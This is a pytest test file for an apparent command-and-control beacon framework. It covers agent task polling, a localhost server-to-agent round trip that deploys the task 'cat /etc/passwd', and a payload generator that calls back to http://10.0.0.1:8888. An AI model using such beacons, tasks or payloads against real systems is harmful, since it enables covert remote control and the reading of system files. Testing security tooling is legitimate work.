import socket
import time

from tools.c2_beacon import BeaconAgent, C2Server, generate_agent_payload


def _free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class TestBeaconAgent:
    def test_task_lifecycle(self):
        agent = BeaconAgent("test-agent", "http://127.0.0.1:9", interval=0.1)
        tid = agent.add_task("whoami")
        assert tid
        results = agent.poll_tasks(lambda cmd: "root")
        assert len(results) == 1
        assert results[0]["status"] == "done"
        assert results[0]["result"] == "root"
        got = agent.get_result(tid)
        assert got and got["status"] == "done"

    def test_task_failure_recorded(self):
        agent = BeaconAgent("a2", "http://127.0.0.1:9")
        agent.add_task("boom")
        results = agent.poll_tasks(lambda cmd: (_ for _ in ()).throw(RuntimeError("x")))
        assert results[0]["status"] == "failed"


class TestC2Server:
    def test_beacon_roundtrip(self):
        port = _free_port()
        srv = C2Server(bind_host="127.0.0.1", bind_port=port, secret="s")
        srv.start()
        try:
            agent = BeaconAgent("agent-1", "http://127.0.0.1:%d" % port, interval=0.1)
            agent.start()
            time.sleep(0.4)
            srv.deploy_task("agent-1", "cat /etc/passwd")
            time.sleep(1.0)
            agents = srv.list_agents()
            assert any(a["id"] == "agent-1" for a in agents)
            agent.stop()
        finally:
            srv.stop()

    def test_generate_agent_payload(self):
        code = generate_agent_payload("http://10.0.0.1:8888", "aid1", interval=2.0)
        assert "aid1" in code
        assert "http://10.0.0.1:8888" in code
        assert "BeaconAgent" in code
